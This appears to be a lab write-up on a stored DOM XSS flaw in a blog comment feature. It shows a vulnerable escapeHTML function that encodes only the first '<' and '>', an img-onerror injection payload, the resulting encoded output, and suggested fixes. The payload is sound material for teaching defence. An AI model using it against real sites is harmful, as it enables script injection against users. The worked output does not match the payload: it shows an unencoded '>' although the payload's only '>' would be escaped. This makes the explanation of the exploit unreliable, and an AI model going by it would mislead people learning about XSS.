# Stored DOM XSS — Incomplete HTML Encoding

## Goal

Exploit a stored DOM XSS vulnerability in the blog comment functionality to execute `alert()`.

## Vulnerable Code

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

## Why It Was Vulnerable

`String.prototype.replace()` replaces only the **first occurrence** when the search argument is a string.

Therefore, the application only encoded the first `<` and first `>`.

## Exploitation

Payload:

```html
<<img src=x onerror='alert(1)'>
```

The first `<` is encoded, but the second `<` remains:

```html
&lt;<img src=x onerror='alert(1)'>&gt;
```

The remaining `<img>` is interpreted as an HTML element, and the `onerror` handler executes JavaScript.

## Key Takeaway

**Incomplete output encoding can lead to XSS.**

When using `replace()` for sanitization, remember that a string search replaces only the first occurrence.

Safer approaches include:

```javascript
html.replace(/</g, '&lt;')
html.replaceAll('<', '&lt;')
```

However, proper context-aware output encoding is preferable to manually building an HTML sanitizer.
